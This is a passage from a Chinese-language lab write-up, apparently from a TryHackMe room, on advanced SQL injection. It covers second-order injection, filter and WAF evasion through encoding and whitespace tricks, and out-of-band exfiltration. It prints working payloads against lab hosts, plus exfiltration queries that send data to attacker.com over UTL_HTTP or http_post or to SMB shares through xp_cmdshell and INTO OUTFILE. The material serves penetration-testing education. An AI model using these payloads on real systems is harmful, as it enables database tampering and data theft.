class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>];</span><br><span class="line"><span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ssn_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_book_name_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_author_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br></pre></td></tr></table></figure><p>然后，这些变量 （） 用于构造 SQL 查询，以更新数据库中指定书籍的详细信息：<code>ssn, new_book_name, new_author</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update_sql</span> = <span class="string">&quot;UPDATE books SET book_name = &#x27;<span class="subst">$new_book_name</span>&#x27;, author = &#x27;<span class="subst">$new_author</span>&#x27; WHERE ssn = &#x27;<span class="subst">$ssn</span>&#x27;; INSERT INTO logs (page) VALUES (&#x27;update.php&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><p>该脚本用于执行多个查询。它还将日志插入日志表中以进行分析。<code>multi_query</code>  </p><p>准备 Payload</p><p>我们知道，我们可以根据他们的 .更新书籍的常规查询可能如下所示：<code>ssn</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">&#x27;$new_book_name&#x27;</span>, author = <span class="string">&#x27;$new_author&#x27;</span> WHERE ssn = <span class="string">&#x27;123123&#x27;</span>;</span><br></pre></td></tr></table></figure><p>但是，如果攻击者插入特别构建的值，则 SQL 命令可能纵。例如，如果攻击者使用值：<code>ssn``ssn</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12345</span><span class="string">&#x27;; UPDATE books SET book_name = &#x27;</span>Hacked<span class="string">&#x27;; --</span></span><br></pre></td></tr></table></figure><p>在 update 查询中使用此值时，它会有效地结束初始 update 命令并启动新命令。这会将 books 表中所有条目的 更改为 <strong>Hacked</strong>。<code>12345``book_name</code>  </p><p><strong>让我们这样做</strong></p><ul><li><strong>Initial Payload Insertion</strong>：添加一本新书籍，并将有效负载作为 .分号 （） 将用于终止当前 SQL 语句。<code>12345&#39;; UPDATE books SET book_name = &#39;Hacked&#39;; --``ssn``;</code></li></ul><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png" alt="image.png"></a></p><ul><li><strong>恶意 SQL 执行</strong>：之后，当管理员或任何其他用户访问 URL 并更新书籍时，插入的有效负载会跳出预期的 SQL 命令结构并注入一个新命令，该命令会更新 books 表中的所有记录。让我们访问页面 ，将书名更新为任何内容，然后单击 <strong>更新</strong> 按钮。该代码将在后端执行以下语句。<code>http://10.10.164.79/second/update.php``http://10.10.164.79/second/update.php page</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">&#x27;Testing&#x27;</span>, author = <span class="string">&#x27;Hacker&#x27;</span> WHERE ssn = <span class="string">&#x27;12345&#x27;</span>; Update books set book_name =<span class="string">&quot;hacked&quot;</span>; --<span class="string">&#x27;; INSERT INTO logs (page) VALUES (&#x27;</span>update.php<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure><ul><li><strong>注释掉其余部分</strong>：双破折号 （） 是一个 SQL 注释符号。SQL Server 将忽略以下任何内容，从而有效地消除原始 SQL 语句中可能导致错误或揭示攻击的任何剩余部分。执行上述查询后，它会将所有书籍的名称更改为 <strong>hacked</strong>，如下所示：<code>--``--</code><br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png" alt="image.png"></a></li></ul><p>在本任务中，我们通过易受攻击的书评 Web 应用程序探索了二阶 SQL 注入概念。作为渗透测试人员，检查用户输入如何存储以及随后在 SQL 查询中使用至关重要。这包括验证所有形式的数据处理是否针对此类漏洞都是安全的，强调全面测试和安全实践知识的重要性，以防止注入威胁。</p><h1 id="Filter-Evasion-技术"><a href="#Filter-Evasion-技术" class="headerlink" title="Filter Evasion 技术"></a>Filter Evasion 技术</h1><p>在高级 SQL 注入攻击中，规避过滤器对于成功利用漏洞至关重要。现代 Web 应用程序通常会实施防御措施来清理或阻止常见的攻击模式，这使得简单的 SQL 注入尝试无效。作为渗透测试人员，我们必须使用更复杂的技术来绕过这些过滤器。本节将介绍此类方法，包括<strong>字符编码</strong>、<strong>无引号</strong> SQL 注入以及处理不能使用<strong>空格</strong>的场景。通过理解和应用这些技术，我们可以通过严格的输入验证和安全控制有效地渗透 Web 应用程序。</p><p>字符编码<br>字符编码涉及将 SQL 注入负载中的特殊字符转换为可能绕过输入过滤器的编码形式。  </p><ul><li><strong>URL 编码</strong>：URL 编码是一种常用方法，其中字符使用百分号 （%） 表示，后跟十六进制的 ASCII 值。例如，payload 可以编码为 .这种编码可以帮助输入通过 Web 应用程序过滤器并被数据库解码，而数据库在初始处理期间可能无法将其识别为恶意输入。<code>&#39; OR 1=1--``%27%20OR%201%3D1--</code></li><li><strong>十六进制编码</strong>：十六进制编码是使用十六进制值构建 SQL 查询的另一种有效技术。例如，查询可以编码为 .通过将字符表示为十六进制数字，攻击者可以绕过在处理输入之前不解码这些值的过滤器。<code>SELECT * FROM users WHERE name = &#39;admin&#39;``SELECT * FROM users WHERE name = 0x61646d696e</code></li><li><code>Unicode Encoding</code>：Unicode 编码使用 Unicode 转义序列表示字符。例如，字符串可以编码为 .此方法可以绕过仅检查特定 ASCII 字符的过滤器，因为数据库将正确处理编码的输入。<code>admin``\u0061\u0064\u006d\u0069\u006e</code></li></ul><p><strong>例</strong></p><p>在此示例中，我们将探讨开发人员如何通过从用户输入中删除特定关键字和字符来实施基本筛选来防止 SQL 注入攻击。但是，我们还将看到攻击者如何使用 URL 编码等字符编码技术绕过这些防御。</p><p><strong>注意</strong>：在接下来的练习中，我们将使用与上一个不同的数据库。您可以在 访问该页面。<code>http://10.10.164.79/encoding/</code></p><p>以下是处理搜索功能的 PHP 代码 （search_books.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$book_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;book_name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;OR&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;AND&quot;</span>, <span class="string">&quot;and&quot;</span> , <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"><span class="variable">$book_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$book_name</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM books WHERE book_name = &#x27;<span class="subst">$book_name</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot; (Error Code: &quot;</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">...</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>以下是 index.html 页中的 Javascript 代码，它提供了用于搜索书籍的用户界面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchBooks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">bookName</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;book_name&#x27;</span>).value;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">xhr</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;search_books.php?book_name=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(bookName), <span class="literal">true</span>);</span><br><span class="line">   xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (this.status === <span class="number">200</span>) &#123;</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;results&#x27;</span>).innerHTML = this.responseText;</span><br></pre></td></tr></table></figure><p>在上面的示例中，开发人员实施了一种基本的防御机制，通过删除特定的 SQL 关键字（如 、、 和 ）来防止 SQL 注入攻击。筛选使用函数，该函数在将这些关键字包含在 SQL 查询中之前从用户输入中去除这些关键字。这种过滤方法旨在使攻击者更难注入恶意 SQL 命令，因为这些关键字对于许多 SQL 注入负载至关重要。<code>OR``AND``UNION``SELECT``str_replace</code></p><p>准备 Payload</p><p>让我们逐步完成准备 SQL 注入有效负载的过程，展示 URL 编码如何绕过基本防御。首先，让我们看看包含特殊字符或 SQL 关键字的普通输入会发生什么情况。当我们搜索一本名为 的书时，我们得到成功的结果如下：<code>Intro to PHP</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png" alt="image.png"></a></p><p>但是，如果我们尝试通过添加特殊字符（如 、 等）来中断查询呢？我们将得到以下输出：<code>&#39;``;</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png" alt="image.png"></a><br>SQL 查询未正确执行，这可能意味着存在 SQL 注入的可能性。让我们尝试注入有效负载 “”。我们将得到以下输出：<code>Intro to PHP&#39; OR 1=1</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png" alt="image.png"></a><br>那么，这里发生了什么？当此输入传递给 PHP 脚本时，该函数将去除 OR 关键字和单引号，从而产生经过清理的输入，该输入不会执行预期的 SQL 注入。此输入无效，因为筛选会删除 SQL 注入成功所需的关键组件。<code>str_replace</code></p><p>要绕过过滤，我们需要使用 URL 编码对输入进行编码，URL 编码以过滤器无法识别和删除的方式表示特殊字符和关键字。以下是示例 payload 。<code>1%27%20||%201=1%20--+</code></p><ul><li><code>%27</code>是单引号 （’） 的 URL 编码。</li><li><code>%20</code>是空格 （ ） 的 URL 编码。</li><li><code>||</code>表示 SQL OR 运算符。</li><li><code>%3D</code>是等号 （&#x3D;） 的 URL 编码。</li><li><code>%2D%2D</code>是在 SQL 中启动注释的 –, 的 URL 编码。</li></ul><p>在上述有效负载中，关闭 SQL 查询中的当前字符串或值。例如，如果查询正在查找与 1 匹配的书名，则 add 将关闭字符串，使 input 的其余部分成为 SQL 语句的一部分。 part 使用 SQL 运算符添加始终为 true 的条件。此条件可确保查询对所有记录返回 true，绕过本应限制结果的原始条件。同样，在 SQL 中启动注释，导致数据库忽略查询的其余部分。这对于终止可能导致语法错误或意外情况的查询的任何剩余部分非常有用。为确保适当的间距，请在注释后添加一个空格，确保注释正确终止并且没有语法问题。<code>1&#39;``&#39;``|| 1=1``OR``--``+</code></p><p>从控制台中，我们可以看到单击搜索按钮会对 .<code>search_book.php</code><br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png" alt="image.png"></a></p><p>让我们直接在 PHP 页面上使用有效负载，以避免来自客户端的不必要调整&#x2F;验证。让我们访问具有标准负载的 URL <a href="http://10.10.164.79/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1">http://10.10.164.79/encoding/search_books.php?book_name&#x3D;Intro%20to%20PHP%27%20OR%201&#x3D;1</a>，您将看到一个错误。<code>Intro to PHP&#39; OR 1=1</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png" alt="image.png"></a></p><p>现在，使用 <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)">Cyber Chef</a> 对负载进行 URL 编码，并尝试使用更新的负载访问 URL。我们将获得以下输出，其中转储完整信息：<code>Intro to PHP&#39; || 1=1 --+</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png" alt="image.png"></a></p><p>有效负载之所以有效，是因为 URL 编码以绕过筛选机制的方式表示特殊字符和 SQL 关键字。当服务器解码 URL 编码的输入时，它会恢复特殊字符和关键字，从而允许 SQL 注入成功执行。使用 URL 编码，攻击者可以构建绕过旨在阻止 SQL 注入的基本输入过滤机制的有效负载。这证明了使用更强大的防御措施的重要性，例如参数化查询和预编译语句，无论输入的编码如何，它们都可以防止 SQL 注入攻击。</p><p>无引号 SQL 注入  </p><p>当应用程序过滤单引号或双引号或转义时，使用无引号 SQL 注入技术。  </p><ul><li><strong>使用数值</strong>：一种方法是使用不需要引号的数值或其他数据类型。例如，攻击者可以在不需要引号的上下文中使用，而不是 injecting 。此技术可以绕过专门查找转义或去除引号的过滤器，从而允许注入继续进行。<code>&#39; OR &#39;1&#39;=&#39;1``OR 1=1</code></li><li><strong>使用 SQL 注释</strong>：另一种方法涉及使用 SQL 注释来终止查询的其余部分。例如，可以将输入转换为 ，其中 this 表示 SQL 中注释的开始，从而有效地忽略 SQL 语句的其余部分。这有助于绕过过滤器并防止语法错误。<code>admin&#39;--``admin--``--</code></li><li><strong>使用 CONCAT（） 函数</strong>：攻击者可以使用 SQL 函数等方式构建不带引号的字符串。例如，构造字符串 admin.该函数和类似方法允许攻击者在不直接使用引号的情况下构建字符串，从而使过滤器更难检测和阻止有效负载。<code>CONCAT()``CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)``CONCAT()</code></li></ul><p>不允许使用空格</p><p>当不允许使用空格或过滤掉空格时，可以使用各种技术来绕过此限制。</p><ul><li><p><strong>替换空格的注释</strong>：一种常见的方法是使用 SQL 注释 （） 来替换空格。例如，攻击者可以使用 ，而不是 。SQL 注释可以替换查询中的空格，从而允许有效负载绕过删除或阻止空格的过滤器。<code>/**/``SELECT * FROM users WHERE name = &#39;admin&#39;``SELECT/**//*FROM/**/users/**/WHERE/**/name/**/=&#39;admin&#39;</code>  </p></li><li><p><strong>制表符或换行符</strong>：另一种方法是使用制表符 （） 或换行符 （） 代替空格。某些筛选器可能允许这些字符，从而使攻击者能够构造类似于 .此技术可以绕过专门查找空格的筛选器。<code>\t``\n``SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t&#39;admin&#39;</code>  </p></li><li><p><strong>替代字符</strong>：一种有效的方法是使用表示不同类型空格的替代 URL 编码字符，例如 （水平制表符）、（换行符）、（换页）、（回车） 和 （不间断空格）。这些字符可以替换有效负载中的空格。<code>%09``%0A</code> <code>%0C</code> <code>%0D``%A0</code></p></li></ul><p>实例</p><p>在此方案中，我们有一个终端节点，该终端节点根据提供的用户名返回用户详细信息。开发人员已实施过滤器来阻止常见的 SQL 注入关键字，例如 OR、AND 和空格 （%20），以防止 SQL 注入攻击。<code>http://10.10.164.79/space/search_users.php?username=?</code>  </p><p>这是开发者添加的 PHP 过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;AND&quot;</span>, <span class="string">&quot;and&quot;</span> ,<span class="string">&quot;or&quot;</span>, <span class="string">&quot;OR&quot;</span> , <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>如果我们在端点上使用标准有效负载，我们可以看到，即使通过 URL 编码，它也没有工作。<code>1%27%20||%201=1%20--+</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png" alt="image.png"></a></p><p>SQL 查询显示代码省略了空格。要绕过这些保护，我们可以使用表示不同类型的空格或换行符的 URL 编码字符，例如 （horizontal tab）、 （换行符）。这些字符可以替换空格，并且仍可由 SQL 解析器正确解释。<code>%09``%0A</code></p><p>可以将原始有效负载修改为使用换行符而不是空格，从而产生有效负载 .此有效负载构造与空格筛选器相同的逻辑条件，但使用换行符来绕过空格筛选器。<code>1&#39; OR 1=1 --``1&#39;%0A||%0A1=1%0A--%27+``1&#39; OR 1=1 --</code></p><p>SQL 解析器将换行符解释为空格，将有效负载转换为 .因此，查询将从 解释为 。<code>1&#39; OR 1=1 --``SELECT * FROM users WHERE username = &#39;$username&#39;``SELECT * FROM users WHERE username = &#39;1&#39; OR 1=1 --</code></p><p>现在，如果我们通过更新的有效负载访问终端节点，我们可以查看所有详细信息。</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png" alt="image.png"></a></p><p>总而言之，重要的是要了解，在处理旨在防止 SQL 注入攻击的过滤器或 Web 应用程序防火墙 （WAF） 时，没有一种技术可以保证绕过。但是，这里有一些可用于规避这些保护的提示和技巧。下表重点介绍了可用于尝试绕过筛选器和 WAF 的各种技术：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>场景</strong></td><td><strong>描述</strong></td><td><strong>例</strong></td></tr><tr><td><strong>像 SELECT 这样的关键词被禁止</strong></td><td>通常可以通过更改大小写或添加内联注释来分解 SQL 关键字</td><td>SElEcT * FrOm 用户或 SE&#x2F;<strong>&#x2F;LECT * FROM&#x2F;</strong>&#x2F;users</td></tr><tr><td><strong>禁止使用 Space</strong></td><td>使用替代空格字符或注释来替换空格有助于绕过过滤器。</td><td>SELECT%0A*%0AFROM%0Ausers 或 SELECT&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td></tr><tr><td><strong>禁止使用 AND、OR 等逻辑运算符</strong></td><td>使用替代逻辑运算符或串联来绕过关键字筛选器。</td><td>用户名 &#x3D; ‘admin’ &amp; password &#x3D; ‘password’ 或用户名 &#x3D; ‘admin’&#x2F;<strong>&#x2F;|&#x2F;</strong>&#x2F;1&#x3D;1 –</td></tr><tr><td><strong>UNION、SELECT 等常见关键字被禁止</strong></td><td>使用等效表示形式（如十六进制或 Unicode 编码）来绕过筛选器。</td><td>SElEcT * FROM users 其中用户名 &#x3D; CHAR（0x61,0x64,0x6D，0x69,0x6E）</td></tr><tr><td><strong>禁止使用 OR、AND、SELECT、UNION 等特定关键字</strong></td><td>使用混淆技术通过将字符与字符串函数或注释组合在一起来伪装 SQL 关键字。</td><td>SElECT * FROM users WHERE username &#x3D; CONCAT（’a’，’d’，’m’，’i’，’n’） 或 SElEcT&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td></tr></tbody></table><p>在实际环境中，您应用的查询和筛选关键字的可见性是无法直接实现的。作为渗透测试人员，重要的是要了解 SQL 注入测试通常涉及命中试验方法，需要耐心和毅力。每个环境都可能具有独特的过滤器和保护措施，因此有必要适应并尝试不同的技术来找到成功的注射向量。</p><h1 id="带外-SQL-注入-1"><a href="#带外-SQL-注入-1" class="headerlink" title="带外 SQL 注入"></a>带外 SQL 注入</h1><p>带外 （OOB） SQL 注入是一种攻击技术，当直接或传统方法无效时，渗透测试人员&#x2F;红队成员使用它来泄露数据或执行恶意操作。与攻击者依赖同一通道进行攻击和数据检索的带内 SQL 注入不同，带外 SQL 注入使用单独的通道来发送有效负载和接收响应。带外技术利用 <strong>HTTP</strong> 请求、<strong>DNS</strong> 查询、<strong>SMB</strong> 协议或数据库服务器可能有权访问的其他网络协议等功能，使攻击者能够绕过防火墙、入侵检测系统和其他安全措施。<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png" alt="image.png"></a><br>带外 SQL 注入的主要优势之一是其隐蔽性和可靠性。通过<strong>使用不同的通信渠道</strong>，攻击者可以最大限度地降低被发现的风险，并与受感染的系统保持持续连接。例如，攻击者可能会注入一个 <strong>SQL 负载，触发数据库服务器向攻击者控制的恶意域发出 DNS 请求</strong>。然后，可以使用响应来提取敏感数据，而无需向监视直接数据库交互的安全机制发出警报。这种方法允许攻击者利用漏洞，即使在攻击者和目标之间的直接连接受到限制或受到审查的复杂网络环境中也是如此。</p><p>为什么使用 OOB</p><p>在直接响应被清理或受到安全措施限制的情况下，OOB 通道使攻击者能够在没有服务器立即反馈的情况下泄露数据。例如，<strong>存储过程</strong>、<strong>输出编码</strong>和<strong>应用程序级别约束</strong>等安全机制可能会<strong>阻止直接响应</strong>，从而使传统的 SQL 注入攻击无效。带外技术（例如使用 DNS 或 HTTP 请求）允许将数据发送到由攻击者控制的外部服务器，从而规避这些限制。</p><p>此外，<strong>入侵检测系统 （IDS）</strong> 和 <strong>Web 应用程序防火墙 （WAF）</strong> 通常会<strong>监控和记录可疑活动的 SQL 查询响应</strong>，从而阻止来自潜在恶意查询的直接响应。通过利用 OOB 通道，攻击者可以通过使用审查较少的网络协议（如 DNS 或 SMB）来传输数据来避免检测。这在攻击者与数据库服务器之间的直接连接受限的网络环境中特别有用，例如当服务器位于防火墙后面或位于不同的网段中时。</p><p>不同数据库中的技术</p><p>带外 SQL 注入攻击利用通过精心设计的查询写入另一个通信通道的方法。当与数据库的直接交互受到限制时，此技术对于泄露数据或执行恶意操作非常有效。数据库中有多个命令可能允许外泄，但以下是各种数据库系统中最常用的命令列表：</p><p><strong>MySQL 和 MariaDB</strong></p><p>在 MySQL 或 MariaDB 中，可以使用 <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT …INTO OUTFILE</a> 或 <a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file">load_file</a> 命令。此命令允许攻击者将查询结果写入服务器文件系统上的文件。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sensitive_data FROM users INTO OUTFILE <span class="string">&#x27;/tmp/out.txt&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后，攻击者可以通过数据库服务器上运行的 SMB 共享或 HTTP 服务器访问此文件，从而通过备用通道泄露数据。</p><p><strong>Microsoft SQL Server （MSSQL）</strong></p><p>在 MSSQL 中，可以使用 <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> 等功能执行带外 SQL 注入，该功能允许直接从 SQL 查询执行 shell 命令。这可用于将数据写入可通过网络共享访问的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell <span class="string">&#x27;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\10.10.58.187\logs\out.txt&quot; -c -T&#x27;</span>;</span><br></pre></td></tr></table></figure><p>或者， 或者 可用于与外部数据源交互，从而促进通过 OOB 通道进行数据泄露。<code>OPENROWSET``BULK INSERT</code>  </p><p><strong>神谕</strong>  </p><p>在 Oracle 数据库中，可以使用 <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html">UTL_HTTP</a> 或 <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html">UTL_FILE</a> 软件包执行带外 SQL 注入。例如，UTL_HTTP 包可用于发送包含敏感数据的 HTTP 请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">  req UTL_HTTP.REQ;</span><br><span class="line">  resp UTL_HTTP.RESP;</span><br><span class="line">BEGIN</span><br><span class="line">  req := UTL_HTTP.<span class="title function_ invoke__">BEGIN_REQUEST</span>(<span class="string">&#x27;http://attacker.com/exfiltrate?sensitive_data=&#x27;</span> || sensitive_data);</span><br><span class="line">  UTL_HTTP.<span class="title function_ invoke__">GET_RESPONSE</span>(req);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>带外技术示例</p><p>MySQL 和 MariaDB 中的带外 SQL 注入技术可以利用各种网络协议来泄露数据。主要方法包括 DNS 泄露、HTTP 请求和 SMB 共享。根据 MySQL&#x2F;MariaDB 环境和网络设置的功能，可以应用这些技术中的每一种。  </p><p><strong>HTTP 协议请求</strong>  </p><p>通过利用允许 HTTP 请求的数据库功能，攻击者可以将敏感数据直接发送到他们控制的 Web 服务器。此方法利用可以建立出站 HTTP 连接的数据库功能。尽管 MySQL 和 MariaDB 本身不支持 HTTP 请求，但如果数据库配置为允许此类操作，则可以通过外部脚本或用户定义函数 （UDF） 来完成此操作。</p><p>首先，需要创建和安装 UDF 以支持 HTTP 请求。此设置很复杂，通常涉及其他配置。示例查询如下所示。<code>SELECT http_post(&#39;http://attacker.com/exfiltrate&#39;, sensitive_data) FROM books;</code></p><p>HTTP 请求泄露可以在 Windows 和 Linux （Ubuntu） 系统上实施，具体取决于数据库对启用 HTTP 请求的外部脚本或 UDF 的支持。</p><p><strong>DNS 解析外泄</strong></p><p>攻击者可以使用 SQL 查询生成带有编码数据的 DNS 请求，这些数据被发送到攻击者控制的恶意 DNS 服务器。此技术绕过基于 HTTP 的监控系统，并利用数据库执行 DNS 查找的能力。</p><p>如上所述，MySQL 本身不支持仅通过 SQL 命令生成 DNS 请求，攻击者可能会使用其他方式（例如自定义用户定义函数 （UDF） 或系统级脚本）来执行 DNS 查找。</p><p><strong>SMB （中小型企业）外泄</strong></p><p>SMB 泄露涉及将查询结果写入外部服务器上的 SMB 共享。此技术在 Windows 环境中特别有效，但也可以通过正确的设置在 Linux 系统中进行配置。示例查询如下所示。<code>SELECT sensitive_data INTO OUTFILE &#39;\\\\10.10.162.175\\logs\\out.txt&#39;;</code></p><p>由于 Windows 本身支持 SMB&#x2F;UNC 路径，因此完全支持此功能。Linux （Ubuntu）：虽然直接 UNC 路径更适用于 Windows，但可以使用 Linux 等工具或通过将共享挂载到本地目录来挂载和访问 SMB 共享。在 SQL 查询中直接使用 UNC 路径可能需要额外的设置或脚本来促进交互。<code>smbclient</code></p><p>实例</p><p>在这个实际场景中，我们将演示攻击者如何使用带外 SQL 注入技术从易受攻击的 Web 应用程序中窃取数据。服务器端代码包含一个 SQL 注入漏洞，该漏洞允许攻击者构建一个有效负载，将查询结果写入外部 SMB 共享。当来自数据库的直接响应受到限制或受监视时，这非常有用。</p><p><strong>场景说明</strong></p><p>在这种情况下，我们将在 的 AttackBox 上启用网络共享。此共享可通过网络访问，并允许将其他计算机中的文件写入其中。您可以假设这样一种情况：您遇到了一个易受攻击的系统，并希望将数据转置到另一个网络共享系统。攻击者将利用此共享来带外泄露数据。要获得网络共享，我们将启动 AttackBox 并在终端中执行以下命令：<code>ATTACKBOX_IP\logs</code>  </p><ul><li>使用 导航到目录<code>impacket``cd /opt/impacket/examples</code></li><li>输入命令以启动共享目录的 SMB 服务器。<code>python3.9 smbserver.py -smb2support -comment &quot;My Logs Server&quot; -debug logs /tmp``/tmp</code></li><li>您可以通过输入命令 